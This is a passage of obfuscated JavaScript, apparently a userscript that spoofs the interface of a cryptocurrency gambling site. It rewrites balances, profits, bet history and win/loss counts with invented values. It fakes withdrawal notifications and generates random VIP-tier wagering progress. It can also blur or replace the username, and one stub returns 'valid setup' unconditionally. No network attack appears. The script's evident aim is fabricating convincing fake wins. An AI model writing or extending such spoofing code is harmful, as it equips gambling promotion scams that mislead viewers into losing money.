      _0x556504 = parseFloat(_0x5c3d59.value);
      _0x20c1de = isNaN(_0x2fe346) || isNaN(_0x556504) ? 0x0 : _0x2fe346 * (_0x556504 - 0x1);
      const _0xac620d = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1nbx5re > div > input");
      const _0x20505e = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div");
      if (_0xac620d) {
        _0xac620d.value = _0x20c1de.toFixed(0x2);
      }
      const _0x4cd48f = {
        'usd': {
          'ltc': _0x58a80a,
          'eth': _0x120044,
          'pol': _0x15c063,
          'btc': _0xfd6c3e,
          'usdt': 0x1
        },
        'eur': {
          'ltc': _0x262b8b,
          'eth': _0x124372,
          'matic': _0x21c78d,
          'btc': _0x217262
        }
      };
      let _0x1981ed;
      if ('usd' === _0xbe34bd) {
        _0x1981ed = _0x4cd48f.usd[_0x48a9fe];
      } else if ('eur' === _0xbe34bd) {
        _0x20c1de *= _0x124a7d;
        _0x1981ed = _0x4cd48f.usd[_0x48a9fe];
      } else if ('inr' === _0xbe34bd) {
        _0x20c1de /= _0x368347;
        _0x1981ed = _0x4cd48f.usd[_0x48a9fe];
      }
      const _0x1ba1fc = (_0x20c1de / _0x1981ed).toFixed(0x8);
      _0x20505e.innerText = _0x1ba1fc + " " + _0x48a9fe.toUpperCase();
    }
    _0x1aad21 = setTimeout(_0x3f189e, 0x32);
  }
  function _0x32f161(_0x491753 = 0x4) {
    const _0x2e372c = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button");
    if (_0x2e372c) {
      _0x2e372c.addEventListener('click', function () {
        setTimeout(function () {
          const _0x20db21 = _0x264fba();
          const _0xaa49e5 = parseFloat(_0x20db21.innerText.replace(/[^\d.]/g, '')) - _0x2fe346;
          const _0x59c161 = _0x369ea9[_0xbe34bd] + _0xaa49e5.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
          _0x20db21.innerText = _0x59c161;
        }, 0x64);
      });
    } else if (_0x491753 > 0x0) {
      setTimeout(function () {
        _0x32f161(_0x491753 - 0x1);
      }, 0x96);
    }
  }
  function _0x27bbd8() {
    const _0x1f83d3 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > div > div > div > button > div > div > span.content.svelte-didcjq > span > span");
    if (!_0x1f83d3) {
      return void setTimeout(_0x27bbd8, 0x64);
    }
    const _0x9bf436 = _0x264fba();
    const _0x324448 = parseFloat(_0x9bf436.innerText.replace(/[^\d.]/g, ''));
    _0x1f83d3.innerText = _0x9bf436.innerText;
    const _0xe1a2e1 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > div > div.input-content.svelte-1nbx5re > input");
    const _0x299b5e = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > span > div.currency-conversion.svelte-e4myuj > div > div");
    const _0x2001a0 = _0xe1a2e1.cloneNode(true);
    _0xe1a2e1.parentNode.replaceChild(_0x2001a0, _0xe1a2e1);
    const _0x3c3774 = {
      'usd': {
        'ltc': _0x58a80a,
        'eth': _0x120044,
        'pol': _0x15c063,
        'btc': _0xfd6c3e,
        'usdt': 0x1
      },
      'eur': {
        'ltc': _0x262b8b,
        'eth': _0x124372,
        'matic': _0x21c78d,
        'btc': _0x217262
      }
    };
    _0x2001a0.addEventListener('input', _0x42c4ae => {
      let _0x3c1d83;
      let _0x23abc4;
      if ("usd" === _0xbe34bd) {
        _0x23abc4 = _0x42c4ae.target.value;
        _0x3c1d83 = _0x3c3774.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x23abc4 = _0x42c4ae.target.value * _0x124a7d;
        _0x3c1d83 = _0x3c3774.usd[_0x48a9fe];
      } else if ("inr" === _0xbe34bd) {
        _0x23abc4 = _0x42c4ae.target.value / _0x368347;
        _0x3c1d83 = _0x3c3774.usd[_0x48a9fe];
      }
      _0x299b5e.innerText = (_0x23abc4 / _0x3c1d83).toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
    });
    _0x2001a0.addEventListener("blur", _0xed78f9 => {
      _0x2001a0.value = Number(_0xed78f9.target.value).toFixed(0x2);
    });
    document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > div > div.input-button-wrap.svelte-1nbx5re > button").addEventListener("click", () => {
      let _0x42db1b;
      let _0x434e48;
      _0x2001a0.value = Number(parseFloat(_0x264fba().innerText.replace(/[^\d.]/g, ''))).toFixed(0x2);
      if ("usd" === _0xbe34bd) {
        _0x434e48 = _0x324448;
        _0x42db1b = _0x3c3774.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x434e48 = _0x324448 * _0x124a7d;
        _0x42db1b = _0x3c3774.usd[_0x48a9fe];
      } else if ('inr' === _0xbe34bd) {
        _0x434e48 = _0x324448 / _0x368347;
        _0x42db1b = _0x3c3774.usd[_0x48a9fe];
      }
      _0x299b5e.innerText = (_0x434e48 / _0x42db1b).toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
    });
    const _0x1f7f23 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > button");
    _0x1f7f23.addEventListener("click", () => {
      event.preventDefault();
      event.stopPropagation();
      _0x1f7f23.disabled = true;
      const _0x31d160 = document.createElement("div");
      _0x31d160.innerHTML = "\n<div class=\"inline-flex justify-center items-center absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2\"><div class=\"loader svelte-5ovsvp\"><div class=\"dot dot-one svelte-5ovsvp\"></div> <div class=\"dot dot-two svelte-5ovsvp\"></div></div></div>\n        ";
      document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > button > div").classList.add("invisible");
      _0x1f7f23.appendChild(_0x31d160);
      const _0x205de0 = Math.floor(0xc9 * Math.random()) + 0x96;
      setTimeout(() => {
        let _0x27922e;
        _0x1f7f23.disabled = false;
        document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > button > div").classList.remove("invisible");
        _0x31d160.parentNode.removeChild(_0x31d160);
        if ("ltc" === _0x48a9fe) {
          _0x27922e = _0x41155a("withdraw_ltc");
        } else if ('eth' === _0x48a9fe) {
          _0x27922e = _0x41155a("withdraw_eth");
        } else if ('pol' === _0x48a9fe) {
          _0x27922e = _0x41155a('withdraw_matic');
        } else if ("btc" === _0x48a9fe) {
          _0x27922e = _0x41155a("withdraw_btc");
        }
        const _0x24f0a7 = _0x27922e.cloneNode(true);
        _0x5c7e3e(_0x24f0a7, 0x10, Number(_0x2001a0.value).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','));
        const _0x445360 = localStorage.getItem(_0x48a9fe + '_vault') || 0x0;
        localStorage.setItem(_0x48a9fe + "_vault", Number(_0x445360) + Number(_0x2001a0.value));
        _0x4dfab7(".notification-list.svelte-18t4teo[style=\"z-index: 1700\"]", _0x24f0a7);
        const _0x42a258 = parseFloat(_0x264fba().innerText.replace(/[^\d.]/g, ''));
        const _0xd2687f = (_0x42a258 - _0x2001a0.value).toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        localStorage.setItem('latest_bal', (_0x42a258 - _0x2001a0.value).toFixed(0x2));
        _0x9bf436.innerText = _0x369ea9[_0xbe34bd] + _0xd2687f;
        _0x2001a0.value = "0.00";
        document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > form > label > span > div.currency-conversion.svelte-e4myuj > div > div").innerText = 0x0.toFixed(0x8) + " " + _0x48a9fe.toUpperCase();
        _0x1f83d3.innerText = _0x369ea9[_0xbe34bd] + _0xd2687f;
      }, _0x205de0);
    });
  }
  let _0x13536b = false;
  let _0x513575 = false;
  let _0x6f6962 = false;
  function _0xc19aae(_0x1cda10) {
    if (!_0x1cda10) {
      return false;
    }
    return _0x1cda10.className.trim().endsWith("!bg-grey-400 !text-white [&_svg]:!text-white");
  }
  function _0x538031(_0xb5c3cd, _0x5c15bc = false) {
    const _0x29e4d5 = {
      'bronze': {
        'min': 0x3e8,
        'max': 0xc34f,
        'text': "Bronze",
        'color': '#C69C6D'
      },
      'silver': {
        'min': 0xc350,
        'max': 0x1869f,
        'text': "Silver",
        'color': "#B2CCCC"
      },
      'gold': {
        'min': 0x186a0,
        'max': 0x3d08f,
        'text': 'Gold',
        'color': '#FED100'
      },
      'plat1': {
        'min': 0x3d090,
        'max': 0x7a11f,
        'text': "Platinum",
        'color': "#6FDDE7"
      },
      'plat2': {
        'min': 0x7a120,
        'max': 0xf423f,
        'text': "Platinum II",
        'color': "#6FDDE7"
      },
      'plat3': {
        'min': 0xf4240,
        'max': 0x26259f,
        'text': "Platinum III",
        'color': "#6FDDE7"
      },
      'plativ': {
        'min': 0x2625a0,
        'max': 0x4c4b3f,
        'text': "Platinum IV",
        'color': "#6FDDE7"
      },
      'platv': {
        'min': 0x4c4b40,
        'max': 0x98967f,
        'text': "Platinum V",
        'color': "#6FDDE7"
      },
      'platvi': {
        'min': 0x989680,
        'max': 0x17d783f,
        'text': "Platinum VI",
        'color': "#6FDDE7"
      },
      'diamond': {
        'min': 0x17d7840,
        'max': 0x2faf07f,
        'text': "Diamond",
        'color': "#0F212E"
      },
      'diamond2': {
        'min': 0x2faf080,
        'max': 0x5f5e0ff,
        'text': "Diamond II",
        'color': '#0F212E'
      },
      'diamond3': {
        'min': 0x5f5e100,
        'max': 0xee6b27f,
        'text': "Diamond III",
        'color': "#0F212E"
      }
    };
    const _0x39fa50 = _0x5c15bc ? parseFloat(localStorage.getItem("previousStats").replace(/,/g, '')) : (Math.floor(Math.random() * (_0x29e4d5[_0xb5c3cd].max - _0x29e4d5[_0xb5c3cd].min + 0x1)) + _0x29e4d5[_0xb5c3cd].min + Math.random()).toFixed(0x2);
    const _0x295fdc = _0x39fa50.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    const _0x287508 = _0x5c15bc ? parseFloat(localStorage.getItem('previousStatsLeft')) : (0x64 - (_0x39fa50 - _0x29e4d5[_0xb5c3cd].min) / (_0x29e4d5[_0xb5c3cd].max - _0x29e4d5[_0xb5c3cd].min) * 0x64).toFixed(0x2);
    if (!_0x5c15bc) {
      localStorage.setItem("previousStats", _0x39fa50);
      localStorage.setItem('previousStatsLeft', _0x287508);
    }
    const _0x6acf0f = localStorage.getItem(_0xb5c3cd);
    if (_0x6acf0f) {
      (function _0x580e8e() {
        new MutationObserver((_0xa3ce63, _0x300824) => {
          if (document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-tags.svelte-smmarv.boxed")) {
            _0x300824.disconnect();
            (function () {
              try {
                const _0x2eb953 = new DOMParser().parseFromString(_0x6acf0f, 'text/html').body.firstChild;
                const _0x41a42f = new DOMParser().parseFromString(_0x6acf0f, "text/html").body.firstChild.firstChild;
                const _0x2a3b90 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-tags.svelte-smmarv.boxed");
                for (; _0x2a3b90.firstChild;) {
                  _0x2a3b90.removeChild(_0x2a3b90.firstChild);
                }
                for (; _0x2eb953.firstChild;) {
                  _0x2a3b90.appendChild(_0x2eb953.firstChild);
                }
                const _0x3a1d16 = '1' === localStorage.getItem('toggleBlurVipProgress');
                const _0x43f474 = localStorage.getItem("blurEffect");
                if (_0x3a1d16) {
                  if ('userBlur' === _0x43f474) {
                    if (document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua")) {
                      document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua").style.filter = "blur(10px)";
                    }
                  } else if ("fakeUser" === _0x43f474) {
                    document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua").innerText = localStorage.getItem("fakeUsername") || "Anonymous";
                  }
                }
                const _0x1bc446 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span:nth-child(1)");
                const _0x5071ee = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span:nth-child(1)");
                const _0x19afbd = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span:nth-child(2)");
                const _0x54ba67 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span:nth-child(2)");
                const _0x1a39bf = document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(4) > div.currency.svelte-didcjq > span.content.svelte-didcjq > span > span");
                const _0x8ae07 = _0x369ea9[_0xbe34bd];
                _0x1a39bf.textContent = _0x8ae07 + _0x295fdc;
                document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.flex.justify-between.items-center.gap-5 > span.flex.gap-1 > span").innerText = (0x64 - _0x287508).toFixed(0x2) + '%';
                document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div").style.right = _0x287508 + '%';
                const _0x4397e2 = document.querySelector("#modal-scroll > div > div > div.user-details.svelte-1xuxzlg > div.user-row.svelte-1xuxzlg > div > span.weight-semibold.line-height-default.align-left.size-md.text-size-md.variant-subtle.with-icon-space.is-truncate.svelte-17v69ua");
                if (_0x4397e2) {
                  const _0x1b9ac9 = _0x4397e2.textContent;
                  _0x1b9ac9.slice(0x0, 0x3);
                  '*'.repeat(_0x1b9ac9.length - 0x3);
                }
                _0x19afbd.textContent = _0x29e4d5[_0xb5c3cd].text;
                if (_0x1bc446 && _0x41a42f && _0x5071ee && _0x19afbd && _0x54ba67) {
                  let _0x2ac35f = null;
                  switch (_0xb5c3cd) {
                    case 'bronze':
                      _0x2ac35f = 'silver';
                      break;
                    case "silver":
                      _0x2ac35f = "gold";
                      break;
                    case "gold":
                      _0x2ac35f = 'plat1';
                      break;
                    case "plat1":
                      _0x2ac35f = "plat2";
                      break;
                    case "plat2":
                      _0x2ac35f = 'plat3';
                      break;
                    case "plat3":
                      _0x2ac35f = 'plativ';
                      break;
                    case 'plativ':
                      _0x2ac35f = 'platv';
                      break;
                    case "platv":
                      _0x2ac35f = "platvi";
                      break;
                    case "platvi":
                      _0x2ac35f = "diamond";
                      break;
                    case "diamond":
                      _0x2ac35f = "diamond2";
                      break;
                    case "diamond2":
                      _0x2ac35f = "diamond3";
                      break;
                    case "diamond3":
                      _0x2ac35f = "obsidian2";
                  }
                  const _0x528998 = localStorage.getItem(_0x2ac35f);
                  const _0x101203 = new DOMParser().parseFromString(_0x528998, "text/html").body.firstChild.firstChild;
                  for (_0x54ba67.textContent = _0x29e4d5[_0x2ac35f].text; _0x5071ee.firstChild;) {
                    _0x5071ee.removeChild(_0x5071ee.firstChild);
                  }
                  for (; _0x101203.firstChild;) {
                    _0x5071ee.appendChild(_0x101203.firstChild);
                  }
                  for (; _0x1bc446.firstChild;) {
                    _0x1bc446.removeChild(_0x1bc446.firstChild);
                  }
                  for (; _0x41a42f.firstChild;) {
                    _0x1bc446.appendChild(_0x41a42f.firstChild);
                  }
                  const _0x3ac089 = localStorage.getItem("totalBets");
                  const _0x2c8eac = localStorage.getItem('numberOfWins');
                  const _0x592d19 = localStorage.getItem("numberOfLosses");
                  if (_0x3ac089 >= 0x2 && _0x2c8eac && _0x592d19) {
                    document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(1) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = _0x3ac089.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(2) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = _0x2c8eac.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                    document.querySelector("#modal-scroll > div > div > div.statistics.svelte-lchq7u > div:nth-child(3) > span.weight-bold.line-height-120pct.align-left.size-md.text-size-md.variant-highlighted.numeric.with-icon-space.svelte-17v69ua").innerText = _0x592d19.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
                  }
                }
              } catch (_0x380f2a) {
                console.error("Error replacing element with children and printing random number for '" + _0xb5c3cd + "':", _0x380f2a);
              }
            })();
            setTimeout(() => {
              _0x580e8e();
            }, 0x7d0);
          }
        }).observe(document.body, {
          'childList': true,
          'subtree': true
        });
      })();
    }
  }
  function _0x3427a3() {
    const _0x5dc48b = document.querySelector("#main-content > div.parent.svelte-1p5gbm2 > div:nth-child(2) > div > div > div > div:nth-child(2) > div > table > tbody");
    if (_0x5dc48b) {
      const _0x5d4a9a = _0x5dc48b.children;
      for (let _0x33c96a = _0x5d4a9a.length - 0x1; _0x33c96a >= 0x0; _0x33c96a--) {
        const _0x185d7b = _0x5d4a9a[_0x33c96a];
        if (_0x185d7b.children.length >= 0x4) {
          const _0x402cdd = _0x185d7b.children[0x0].innerText.trim();
          const _0x4c2db8 = _0x185d7b.children[0x1].innerText.trim();
          const _0x5c12af = _0x185d7b.children[0x3].innerText.trim();
          for (let _0xf72ec3 = _0x276961.length - 0x1; _0xf72ec3 >= 0x0; _0xf72ec3--) {
            const {
              game: _0x25f6d6,
              time: _0x250271,
              multiplier: _0x11ca72,
              bet_amount: _0x159cc9,
              payout: _0x431527
            } = _0x276961[_0xf72ec3];
            if (_0x402cdd === _0x25f6d6 && _0x4c2db8 === _0x250271 && _0x5c12af === _0x11ca72) {
              const _0x289eaa = "#main-content > div.parent.svelte-1p5gbm2 > div:nth-child(2) > div > div > div > div:nth-child(2) > div > table > tbody > tr:nth-child(" + (_0x33c96a + 0x1) + ") > td:nth-child(3) > div > span.content.svelte-didcjq > span > span";
              const _0x4ef553 = "#main-content > div.parent.svelte-1p5gbm2 > div:nth-child(2) > div > div > div > div:nth-child(2) > div > table > tbody > tr:nth-child(" + (_0x33c96a + 0x1) + ") > td:nth-child(5) > div > span.content.svelte-didcjq > span > span";
              const _0x41cf75 = document.querySelector(_0x289eaa);
              const _0x124e74 = _0x369ea9[_0xbe34bd];
              if (_0x41cf75 && _0x41cf75.innerText.trim() === _0x124e74 + "0.00") {
                _0x41cf75.innerText = _0x159cc9;
              }
              const _0x271abe = document.querySelector(_0x4ef553);
              if (_0x271abe && _0x271abe.innerText.trim() === _0x124e74 + "0.00") {
                _0x271abe.innerText = _0x431527;
              }
              break;
            }
          }
        }
      }
    }
  }
  function _0x473b7d() {
    const _0xf0c1b2 = new MutationObserver((_0x308751, _0x1daf31) => {
      for (const _0x994245 of _0x308751) if (_0x994245.addedNodes.length > 0x0) {
        _0x3427a3();
      }
    });
    !function _0x5a7e07() {
      const _0x3c3a4c = document.querySelector("#main-content > div.parent.svelte-1p5gbm2 > div:nth-child(2) > div > div > div > div:nth-child(2) > div > table > tbody");
      if (_0x3c3a4c) {
        _0xf0c1b2.observe(_0x3c3a4c, {
          'childList': true,
          'subtree': true
        });
        _0x2099eb = setInterval(_0x3427a3, 0x64);
      } else {
        setTimeout(_0x5a7e07, 0x3e8);
      }
    }();
  }
  function _0xb92d45() {
    return true; // Always return valid setup
  }
  new MutationObserver((_0x1c04c, _0x365f04) => {
    const _0x21efb2 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5");
    const _0x3c6d6d = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q");
    const _0x732015 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden");
    const _0x1b3b2a = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.title-wrap.svelte-1am3p27 > h2");
    const _0x2972fc = document.querySelector("div[data-portal=\"true\"]");
    const _0x5995b4 = document.querySelector("#svelte > div.modal.svelte-cq3ecl > div.card.size-md.svelte-cq3ecl > div.header.svelte-227w12 > h2 > span");
    let _0x3c8e02 = localStorage.getItem("selectedTier") || "bronze";
    if (_0x21efb2 && !_0xef9750) {
      _0xef9750 = true;
      (function (_0xc03d03, _0x266b5e = false) {
        try {
          const _0x59cf8b = {
            'bronze': {
              'min': 0x3e8,
              'max': 0xc34f,
              'text': 'Bronze',
              'color': "#C69C6D"
            },
            'silver': {
              'min': 0xc350,
              'max': 0x1869f,
              'text': "Silver",
              'color': "#B2CCCC"
            },
            'gold': {
              'min': 0x186a0,
              'max': 0x3d08f,
              'text': 'Gold',
              'color': "#FED100"
            },
            'plat1': {
              'min': 0x3d090,
              'max': 0x7a11f,
              'text': "Platinum",
              'color': "#6FDDE7"
            },
            'plat2': {
              'min': 0x7a120,
              'max': 0xf423f,
              'text': "Platinum II",
              'color': "#6FDDE7"
            },
            'plat3': {
              'min': 0xf4240,
              'max': 0x26259f,
              'text': "Platinum III",
              'color': "#6FDDE7"
            },
            'plativ': {
              'min': 0x2625a0,
              'max': 0x4c4b3f,
              'text': "Platinum IV",
              'color': '#6FDDE7'
            },
            'platv': {
              'min': 0x4c4b40,
              'max': 0x98967f,
              'text': "Platinum V",
              'color': "#6FDDE7"
            },
            'platvi': {
              'min': 0x989680,
              'max': 0x17d783f,
              'text': "Platinum VI",
              'color': "#6FDDE7"
            },
            'diamond': {
              'min': 0x17d7840,
              'max': 0x2faf07f,
              'text': "Diamond",
              'color': "#00E4FB"
            },
            'diamond2': {
              'min': 0x2faf080,
              'max': 0x5f5e0ff,
              'text': "Diamond II",
              'color': '#00E4FB'
            },
            'diamond3': {
              'min': 0x5f5e100,
              'max': 0xee6b27f,
              'text': "Diamond III",
              'color': "#00E4FB"
            }
          };
          const _0x34499a = _0x266b5e ? parseFloat(localStorage.getItem('previousStats').replace(/,/g, '')) : (Math.floor(Math.random() * (_0x59cf8b[_0xc03d03].max - _0x59cf8b[_0xc03d03].min + 0x1)) + _0x59cf8b[_0xc03d03].min + Math.random()).toFixed(0x2);
          const _0x1ad88e = _0x266b5e ? parseFloat(localStorage.getItem("previousStatsLeft")) : (0x64 - (_0x34499a - _0x59cf8b[_0xc03d03].min) / (_0x59cf8b[_0xc03d03].max - _0x59cf8b[_0xc03d03].min) * 0x64).toFixed(0x2);
          if (!_0x266b5e) {
            localStorage.setItem("previousStats", _0x34499a);
            localStorage.setItem("previousStatsLeft", _0x1ad88e);
          }
          const _0x3f5244 = {
            'bronze': 'silver',
            'silver': 'gold',
            'gold': "plat1",
            'plat1': 'plat2',
            'plat2': 'plat3',
            'plat3': "plativ",
            'plativ': "platv",
            'platv': 'platvi',
            'platvi': "diamond",
            'diamond': 'diamond2',
            'diamond2': "diamond3",
            'diamond3': "obsidian2"
          }[_0xc03d03];
          const _0x49211f = localStorage.getItem(_0xc03d03);
          const _0xfba973 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.flex.justify-between.mb-6 > svg");
          const _0x3f680e = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span.svelte-1ew5yq8");
          const _0x5a3491 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span.svelte-1ew5yq8");
          const _0x283773 = new DOMParser().parseFromString(_0x49211f, "text/html").body.firstChild.firstChild;
          const _0x582e3b = new DOMParser().parseFromString(_0x49211f, "text/html").body.firstChild.firstChild;
          const _0x1042d1 = new DOMParser().parseFromString(localStorage.getItem(_0x3f5244), "text/html").body.firstChild.firstChild;
          const _0x345d33 = _0x283773.firstChild.firstChild.firstChild;
          document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.flex.justify-between.items-center.gap-5 > span.flex.gap-1 > span").innerText = (0x64 - _0x1ad88e).toFixed(0x2) + '%';
          for (document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div").style.right = _0x1ad88e + '%'; _0xfba973.firstChild;) {
            _0xfba973.removeChild(_0xfba973.firstChild);
          }
          for (_0x345d33 && _0xfba973.appendChild(_0x345d33); _0x3f680e.firstChild;) {
            _0x3f680e.removeChild(_0x3f680e.firstChild);
          }
          for (; _0x582e3b.firstChild;) {
            _0x3f680e.appendChild(_0x582e3b.firstChild);
          }
          for (; _0x5a3491.firstChild;) {
            _0x5a3491.removeChild(_0x5a3491.firstChild);
          }
          for (; _0x1042d1.firstChild;) {
            _0x5a3491.appendChild(_0x1042d1.firstChild);
          }
          let _0x28a4e0 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div");
          if (_0x28a4e0 && _0x28a4e0.style.border) {
            let _0x30b165 = _0x59cf8b[_0xc03d03].color;
            _0x28a4e0.style.border = _0x28a4e0.style.border.replace(/#[0-9A-Fa-f]{6}|rgb[a]?\(.*?\)/, _0x30b165);
          }
          let _0xb563a1 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div");
          if (_0xb563a1 && _0xb563a1.style.backgroundColor) {
            let _0x5ed296 = _0x27463e(_0x59cf8b[_0xc03d03].color);
            _0xb563a1.style.backgroundColor = _0xb563a1.style.backgroundColor.replace(/rgb\(.*?\)/, _0x5ed296);
          }
          document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span.weight-semibold.line-height-120pct.align-left.size-default.text-size-default.variant-subtle.with-icon-space.svelte-17v69ua").textContent = _0x59cf8b[_0xc03d03].text;
          document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span.weight-semibold.line-height-120pct.align-left.size-default.text-size-default.variant-subtle.with-icon-space.svelte-17v69ua").textContent = _0x59cf8b[_0x3f5244].text;
          if ('1' === localStorage.getItem("toggleBlurVipProgress")) {
            if ('fakeUser' === localStorage.getItem("blurEffect")) {
              document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.flex.justify-between.mb-6 > span").innerText = localStorage.getItem("fakeUsername") || "Anonymous";
            } else {
              document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div.progress-wrap.svelte-1yrgho5 > div > div > div > div.flex.justify-between.mb-6 > span").style.filter = "blur(10px)";
            }
          }
        } catch (_0x5a8414) {
          console.error("An error occurred:", _0x5a8414);
        }
        setTimeout(() => {
          _0xef9750 = false;
        }, 0xc8);
      })(_0x3c8e02, true);
    }
    if (_0x3c6d6d && !_0x52a1fe) {
      _0x52a1fe = true;
      (function (_0x324ef8, _0x518cb2 = false) {
        try {
          const _0x3fb235 = {
            'bronze': {
              'min': 0x3e8,
              'max': 0xc34f,
              'text': 'Bronze',
              'color': "#C69C6D"
            },
            'silver': {
              'min': 0xc350,
              'max': 0x1869f,
              'text': 'Silver',
              'color': "#B2CCCC"
            },
            'gold': {
              'min': 0x186a0,
              'max': 0x3d08f,
              'text': "Gold",
              'color': '#FED100'
            },
            'plat1': {
              'min': 0x3d090,
              'max': 0x7a11f,
              'text': "Platinum",
              'color': "#6FDDE7"
            },
            'plat2': {
              'min': 0x7a120,
              'max': 0xf423f,
              'text': "Platinum II",
              'color': "#6FDDE7"
            },
            'plat3': {
